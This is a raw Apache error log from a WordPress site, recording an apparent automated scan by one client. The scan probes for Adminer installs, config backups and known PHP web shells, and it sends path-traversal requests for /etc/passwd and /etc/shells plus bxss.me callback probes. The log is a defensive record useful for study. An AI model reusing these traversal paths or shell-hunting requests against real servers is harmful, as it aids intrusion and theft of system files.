[Thu Jul 08 01:14:03.523622 2021] [http:error] [pid 6722] [client 27.147.202.214:8235] AH02430: Response header 'Location' value of 'https://www.bubandcompany.com/\n.example.com' contains invalid characters, aborting request
[Thu Jul 08 01:14:04.116893 2021] [php7:error] [pid 7218] [client 27.147.202.214:8237] script '/var/www/html/bubandcompany.com/adminer-4.3.0.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:04.230738 2021] [php7:error] [pid 6874] [client 27.147.202.214:8242] script '/var/www/html/bubandcompany.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:04.545111 2021] [php7:error] [pid 5952] [client 27.147.202.214:8241] script '/var/www/html/bubandcompany.com/adminer-4.3.1.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:05.101414 2021] [php7:error] [pid 7222] [client 27.147.202.214:8252] script '/var/www/html/bubandcompany.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:05.218539 2021] [php7:error] [pid 6839] [client 27.147.202.214:8229] script '/var/www/html/bubandcompany.com/ad.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:05.291162 2021] [php7:error] [pid 6722] [client 27.147.202.214:8244] script '/var/www/html/bubandcompany.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:05.312042 2021] [php7:error] [pid 5682] [client 27.147.202.214:8262] script '/var/www/html/bubandcompany.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:05.370009 2021] [php7:error] [pid 1935] [client 27.147.202.214:8227] script '/var/www/html/bubandcompany.com/_adminer.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:06.146781 2021] [php7:error] [pid 7226] [client 27.147.202.214:8245] script '/var/www/html/bubandcompany.com/adminer-4.4.0.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:06.156010 2021] [php7:error] [pid 7223] [client 27.147.202.214:8261] script '/var/www/html/bubandcompany.com/adminer-4.6.2.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:06.185319 2021] [php7:error] [pid 6565] [client 27.147.202.214:8239] script '/var/www/html/bubandcompany.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:07.152931 2021] [php7:error] [pid 7230] [client 27.147.202.214:8259] script '/var/www/html/bubandcompany.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:07.200911 2021] [php7:error] [pid 7233] [client 27.147.202.214:8247] script '/var/www/html/bubandcompany.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:07.273650 2021] [php7:error] [pid 6968] [client 27.147.202.214:8250] script '/var/www/html/bubandcompany.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:07.511585 2021] [php7:error] [pid 7224] [client 27.147.202.214:8232] script '/var/www/html/bubandcompany.com/adminer-4.2.5.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:07.783903 2021] [php7:error] [pid 7231] [client 27.147.202.214:8236] script '/var/www/html/bubandcompany.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.166427 2021] [php7:error] [pid 5844] [client 27.147.202.214:8243] script '/var/www/html/bubandcompany.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.320670 2021] [php7:error] [pid 7243] [client 27.147.202.214:8240] script '/var/www/html/bubandcompany.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.343958 2021] [php7:error] [pid 7244] [client 27.147.202.214:8254] script '/var/www/html/bubandcompany.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.400871 2021] [php7:error] [pid 7228] [client 27.147.202.214:8233] script '/var/www/html/bubandcompany.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.406384 2021] [php7:error] [pid 7247] [client 27.147.202.214:8248] script '/var/www/html/bubandcompany.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.419763 2021] [php7:error] [pid 7248] [client 27.147.202.214:8256] script '/var/www/html/bubandcompany.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.448708 2021] [php7:error] [pid 7250] [client 27.147.202.214:8260] script '/var/www/html/bubandcompany.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.559299 2021] [php7:error] [pid 7227] [client 27.147.202.214:8230] script '/var/www/html/bubandcompany.com/ad.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.607492 2021] [php7:error] [pid 7239] [client 27.147.202.214:8255] script '/var/www/html/bubandcompany.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.655034 2021] [php7:error] [pid 7240] [client 27.147.202.214:8234] script '/var/www/html/bubandcompany.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.696692 2021] [php7:error] [pid 7241] [client 27.147.202.214:8246] script '/var/www/html/bubandcompany.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:08.820849 2021] [php7:error] [pid 7235] [client 27.147.202.214:8251] script '/var/www/html/bubandcompany.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:09.558385 2021] [php7:error] [pid 7257] [client 27.147.202.214:8249] script '/var/www/html/bubandcompany.com/adminer-4.5.0.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:09.573486 2021] [php7:error] [pid 6869] [client 27.147.202.214:8264] script '/var/www/html/bubandcompany.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:09.609323 2021] [php7:error] [pid 7260] [client 27.147.202.214:8276] script '/var/www/html/bubandcompany.com/bitrix_server_test.php' not found or unable to stat
[Thu Jul 08 01:14:09.800598 2021] [php7:error] [pid 7232] [client 27.147.202.214:8228] script '/var/www/html/bubandcompany.com/adminer.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:09.902433 2021] [php7:error] [pid 7251] [client 27.147.202.214:8238] script '/var/www/html/bubandcompany.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:10.121296 2021] [php7:error] [pid 7267] [client 27.147.202.214:8253] script '/var/www/html/bubandcompany.com/adminer-4.6.0.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:10.131308 2021] [php7:error] [pid 7252] [client 27.147.202.214:8263] script '/var/www/html/bubandcompany.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:10.453601 2021] [php7:error] [pid 7270] [client 27.147.202.214:8231] script '/var/www/html/bubandcompany.com/Adminer.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:10.787710 2021] [php7:error] [pid 7237] [client 27.147.202.214:8258] script '/var/www/html/bubandcompany.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:11.787946 2021] [php7:error] [pid 7231] [client 27.147.202.214:8236] script '/var/www/html/bubandcompany.com/opcache.php' not found or unable to stat
[Thu Jul 08 01:14:11.991511 2021] [php7:error] [pid 7245] [client 27.147.202.214:8257] script '/var/www/html/bubandcompany.com/adminer-4.6.1.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:12.047070 2021] [php7:error] [pid 7270] [client 27.147.202.214:8231] script '/var/www/html/bubandcompany.com/opcache.php' not found or unable to stat
[Thu Jul 08 01:14:12.520230 2021] [core:error] [pid 7224] [client 27.147.202.214:8232] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:14:13.872141 2021] [core:error] [pid 7240] [client 27.147.202.214:8234] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Thu Jul 08 01:14:14.884041 2021] [core:error] [pid 7268] [client 27.147.202.214:11669] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Thu Jul 08 01:14:15.515698 2021] [core:error] [pid 7237] [client 27.147.202.214:8258] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Thu Jul 08 01:14:20.930195 2021] [authz_core:error] [pid 7225] [client 27.147.202.214:8221] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/server-status
[Thu Jul 08 01:14:23.827012 2021] [php7:error] [pid 7225] [client 27.147.202.214:8221] script '/var/www/html/bubandcompany.com/coredumpcheck.php' not found or unable to stat
[Thu Jul 08 01:14:26.330175 2021] [php7:error] [pid 7231] [client 27.147.202.214:8236] script '/var/www/html/bubandcompany.com/loader-wizard.php' not found or unable to stat
[Thu Jul 08 01:14:28.741051 2021] [negotiation:error] [pid 7266] [client 27.147.202.214:11665] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:14:30.871065 2021] [core:error] [pid 7267] [client 27.147.202.214:8253] AH00126: Invalid URI in request GET @uri1.hit77468883285bb39.group.bxss.me/ HTTP/1.1
[Thu Jul 08 01:14:31.913863 2021] [authz_core:error] [pid 7228] [client 27.147.202.214:8233] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/server-status
[Thu Jul 08 01:14:33.477690 2021] [core:error] [pid 7242] [client 27.147.202.214:8691] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:14:34.020221 2021] [core:error] [pid 7239] [client 27.147.202.214:1185] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Thu Jul 08 01:14:34.802349 2021] [core:error] [pid 7247] [client 27.147.202.214:6016] AH00126: Invalid URI in request GET .uri3.hit77468883285bb39.group.bxss.me/ HTTP/1.1
[Thu Jul 08 01:14:36.078490 2021] [php7:error] [pid 6738] [client 27.147.202.214:6004] script '/var/www/html/bubandcompany.com/n9ldshdempgd.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:14:37.410865 2021] [core:error] [pid 7228] [client 27.147.202.214:8233] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:15:20.115343 2021] [php7:error] [pid 4264] [client 27.147.202.214:8779] script '/var/www/html/bubandcompany.com/app_dev.php' not found or unable to stat
[Thu Jul 08 01:15:37.116195 2021] [php7:error] [pid 7382] [client 27.147.202.214:3500] script '/var/www/html/bubandcompany.com/login.php' not found or unable to stat
[Thu Jul 08 01:15:44.879615 2021] [php7:error] [pid 7221] [client 27.147.202.214:7661] script '/var/www/html/bubandcompany.com/apc.php' not found or unable to stat
[Thu Jul 08 01:15:46.802416 2021] [core:error] [pid 7242] [client 27.147.202.214:7671] AH00126: Invalid URI in request GET /wp-admin/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:15:48.981530 2021] [php7:error] [pid 7392] [client 27.147.202.214:7672] script '/var/www/html/bubandcompany.com/wp-admin/9q8wszai3e8f.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:15:51.035274 2021] [authz_core:error] [pid 7415] [client 27.147.202.214:7683] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/.htaccess
[Thu Jul 08 01:15:55.893377 2021] [php7:error] [pid 6836] [client 27.147.202.214:7657] script '/var/www/html/bubandcompany.com/wp-admin/installj2EMm.php' not found or unable to stat
[Thu Jul 08 01:15:57.415245 2021] [php7:error] [pid 7221] [client 27.147.202.214:7661] script '/var/www/html/bubandcompany.com/wp-admin/iXN2Cinstall.php' not found or unable to stat
[Thu Jul 08 01:15:58.875099 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/rGhonOmu.php' not found or unable to stat
[Thu Jul 08 01:15:59.188121 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/db.php' not found or unable to stat
[Thu Jul 08 01:15:59.833437 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/conf.php' not found or unable to stat
[Thu Jul 08 01:16:00.495223 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/settings.php' not found or unable to stat
[Thu Jul 08 01:16:01.134065 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/config.php' not found or unable to stat
[Thu Jul 08 01:16:01.572067 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] script '/var/www/html/bubandcompany.com/wp-admin/old_install.php' not found or unable to stat
[Thu Jul 08 01:16:01.778562 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/config.inc.php' not found or unable to stat
[Thu Jul 08 01:16:01.909396 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] script '/var/www/html/bubandcompany.com/wp-admin/install_old.php' not found or unable to stat
[Thu Jul 08 01:16:02.096383 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/localconfig.php' not found or unable to stat
[Thu Jul 08 01:16:02.235553 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] script '/var/www/html/bubandcompany.com/wp-admin/install_bak.php' not found or unable to stat
[Thu Jul 08 01:16:02.758901 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/configuration.php' not found or unable to stat
[Thu Jul 08 01:16:03.416390 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/settings.inc.php' not found or unable to stat
[Thu Jul 08 01:16:03.740981 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/global.inc.php' not found or unable to stat
[Thu Jul 08 01:16:04.046240 2021] [php7:error] [pid 7391] [client 27.147.202.214:7686] script '/var/www/html/bubandcompany.com/database.php' not found or unable to stat
[Thu Jul 08 01:16:04.690373 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] script '/var/www/html/bubandcompany.com/database.inc.php' not found or unable to stat
[Thu Jul 08 01:16:05.714143 2021] [negotiation:error] [pid 7418] [client 27.147.202.214:7691] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/wp-admin/install (None could be negotiated).
[Thu Jul 08 01:16:07.275255 2021] [negotiation:error] [pid 7399] [client 27.147.202.214:7693] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:16:07.975162 2021] [negotiation:error] [pid 7399] [client 27.147.202.214:7693] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:16:08.286882 2021] [php7:error] [pid 7393] [client 27.147.202.214:7675] script '/var/www/html/bubandcompany.com/phpinfo.php' not found or unable to stat
[Thu Jul 08 01:16:08.673402 2021] [negotiation:error] [pid 7399] [client 27.147.202.214:7693] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:16:08.941915 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/pi.php' not found or unable to stat
[Thu Jul 08 01:16:09.477424 2021] [negotiation:error] [pid 7399] [client 27.147.202.214:7693] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:16:09.522243 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/r57shell.php' not found or unable to stat
[Thu Jul 08 01:16:09.597982 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/php.php' not found or unable to stat
[Thu Jul 08 01:16:09.854809 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/r57.php' not found or unable to stat
[Thu Jul 08 01:16:09.925248 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/i.php' not found or unable to stat
[Thu Jul 08 01:16:10.175304 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/r58.php' not found or unable to stat
[Thu Jul 08 01:16:10.256693 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/test.php' not found or unable to stat
[Thu Jul 08 01:16:10.499143 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/c99shell.php' not found or unable to stat
[Thu Jul 08 01:16:10.578682 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/temp.php' not found or unable to stat
[Thu Jul 08 01:16:10.751243 2021] [php7:error] [pid 7413] [client 27.147.202.214:7703] script '/var/www/html/bubandcompany.com/wp-admin/upgradeRrcMz.php' not found or unable to stat
[Thu Jul 08 01:16:10.820728 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/c99.php' not found or unable to stat
[Thu Jul 08 01:16:10.899774 2021] [php7:error] [pid 7409] [client 27.147.202.214:7694] script '/var/www/html/bubandcompany.com/info.php' not found or unable to stat
[Thu Jul 08 01:16:11.142185 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/nstview.php' not found or unable to stat
[Thu Jul 08 01:16:11.394656 2021] [php7:error] [pid 7413] [client 27.147.202.214:7703] script '/var/www/html/bubandcompany.com/wp-admin/FP7IHupgrade.php' not found or unable to stat
[Thu Jul 08 01:16:11.464803 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/nst.php' not found or unable to stat
[Thu Jul 08 01:16:11.789582 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/rst.php' not found or unable to stat
[Thu Jul 08 01:16:12.112878 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/r57eng.php' not found or unable to stat
[Thu Jul 08 01:16:12.431375 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/shell.php' not found or unable to stat
[Thu Jul 08 01:16:12.949178 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/webadmin.php' not found or unable to stat
[Thu Jul 08 01:16:13.324205 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/dra.php' not found or unable to stat
[Thu Jul 08 01:16:14.010767 2021] [negotiation:error] [pid 7227] [client 27.147.202.214:7669] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/wp-admin/upgrade (None could be negotiated).
[Thu Jul 08 01:16:14.233361 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/r.php' not found or unable to stat
[Thu Jul 08 01:16:14.556323 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/lol.php' not found or unable to stat
[Thu Jul 08 01:16:15.435116 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/zehir.php' not found or unable to stat
[Thu Jul 08 01:16:15.757603 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/c-h.v2.php' not found or unable to stat
[Thu Jul 08 01:16:16.617084 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/php-backdoor.php' not found or unable to stat
[Thu Jul 08 01:16:16.940317 2021] [php7:error] [pid 7395] [client 27.147.202.214:7690] script '/var/www/html/bubandcompany.com/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 01:16:16.943585 2021] [php7:error] [pid 7272] [client 27.147.202.214:7676] script '/var/www/html/bubandcompany.com/wp-admin/old_upgrade.php' not found or unable to stat
[Thu Jul 08 01:16:17.260132 2021] [php7:error] [pid 7272] [client 27.147.202.214:7676] script '/var/www/html/bubandcompany.com/wp-admin/upgrade_old.php' not found or unable to stat
[Thu Jul 08 01:16:17.579698 2021] [php7:error] [pid 7272] [client 27.147.202.214:7676] script '/var/www/html/bubandcompany.com/wp-admin/upgrade_bak.php' not found or unable to stat
[Thu Jul 08 01:16:19.375192 2021] [php7:error] [pid 7396] [client 27.147.202.214:7692] script '/var/www/html/bubandcompany.com/phpThumb.php' not found or unable to stat
[Thu Jul 08 01:16:25.045091 2021] [php7:error] [pid 7269] [client 27.147.202.214:9699] script '/var/www/html/bubandcompany.com/wp-admin/css/8pcnufrhh6vx.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:28.093490 2021] [php7:error] [pid 7430] [client 27.147.202.214:9736] script '/var/www/html/bubandcompany.com/wp-admin/images/3iarisowxk1l.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:28.550831 2021] [autoindex:error] [pid 7399] [client 27.147.202.214:9701] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:28.866428 2021] [authz_core:error] [pid 7409] [client 27.147.202.214:7694] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/.htaccess~
[Thu Jul 08 01:16:28.876073 2021] [core:error] [pid 7399] [client 27.147.202.214:9701] AH00126: Invalid URI in request GET /icons/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:16:29.742541 2021] [authz_core:error] [pid 7409] [client 27.147.202.214:7694] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/.htaccess.old
[Thu Jul 08 01:16:30.069179 2021] [authz_core:error] [pid 7409] [client 27.147.202.214:7694] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/.htaccess.save
[Thu Jul 08 01:16:30.092978 2021] [autoindex:error] [pid 7504] [client 27.147.202.214:7348] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:30.155087 2021] [autoindex:error] [pid 7383] [client 27.147.202.214:9737] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:30.476772 2021] [autoindex:error] [pid 7383] [client 27.147.202.214:9737] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:30.608901 2021] [autoindex:error] [pid 7389] [client 27.147.202.214:7689] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:31.257259 2021] [autoindex:error] [pid 7509] [client 27.147.202.214:7360] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:31.434602 2021] [autoindex:error] [pid 7419] [client 27.147.202.214:7699] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:31.542223 2021] [php7:error] [pid 7510] [client 27.147.202.214:7350] script '/usr/share/apache2/icons/87ezuois4dwj.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:31.579658 2021] [autoindex:error] [pid 7511] [client 27.147.202.214:7363] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:31.595280 2021] [autoindex:error] [pid 7509] [client 27.147.202.214:7360] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:31.768507 2021] [autoindex:error] [pid 7452] [client 27.147.202.214:7354] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.bubandcompany.com/wp-admin/images/
[Thu Jul 08 01:16:32.223970 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] PHP Fatal error:  Out of memory (allocated 65011712) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-separator.php on line 694, referer: https://www.bubandcompany.com/readme.html
[Thu Jul 08 01:16:32.278762 2021] [php7:error] [pid 6869] [client 27.147.202.214:7664] PHP Fatal error:  Out of memory (allocated 65011712) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-phpass.php on line 1, referer: https://www.bubandcompany.com/readme.html
[Thu Jul 08 01:16:32.880241 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/vUPSIEL2.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:33.165589 2021] [php7:error] [pid 7505] [client 27.147.202.214:7352] script '/var/www/html/bubandcompany.com/install.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:33.613599 2021] [php7:error] [pid 7455] [client 27.147.202.214:9700] PHP Fatal error:  Out of memory (allocated 8388608) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php on line 1085
[Thu Jul 08 01:16:33.663188 2021] [php7:error] [pid 7519] [client 27.147.202.214:7410] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-includes/capabilities.php on line 615
[Thu Jul 08 01:16:33.663683 2021] [php7:error] [pid 7410] [client 27.147.202.214:7674] PHP Fatal error:  Out of memory (allocated 23068672) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/options/extra.php on line 917
[Thu Jul 08 01:16:33.703948 2021] [php7:error] [pid 7410] [client 27.147.202.214:7674] PHP Fatal error:  Out of memory (allocated 23068672) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 276
[Thu Jul 08 01:16:33.837788 2021] [php7:error] [pid 7239] [client 27.147.202.214:9698] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/wc-deprecated-functions.php on line 517
[Thu Jul 08 01:16:33.876500 2021] [php7:error] [pid 7239] [client 27.147.202.214:9698] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 65536 bytes) in Unknown on line 0
[Thu Jul 08 01:16:33.818547 2021] [php7:error] [pid 7392] [client 204.48.19.85:54904] PHP Fatal error:  Out of memory (allocated 20971520) (tried to allocate 12288 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/lib/packages/League/Container/Definition/Definition.php on line 222, referer: https://bubandcompany.com/wp-cron.php?doing_wp_cron=1625721388.3886280059814453125000
[Thu Jul 08 01:16:33.929271 2021] [authz_core:error] [pid 7452] [client 27.147.202.214:7354] AH01630: client denied by server configuration: /var/www/html/bubandcompany.com/wp-admin/.php, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:34.259267 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/install&n955795=v996333.php' not found or unable to stat
[Thu Jul 08 01:16:34.678198 2021] [php7:error] [pid 7447] [client 27.147.202.214:9713] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/blocks/social-link.php on line 74
[Thu Jul 08 01:16:34.686747 2021] [php7:error] [pid 7447] [client 27.147.202.214:9713] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 65536 bytes) in Unknown on line 0
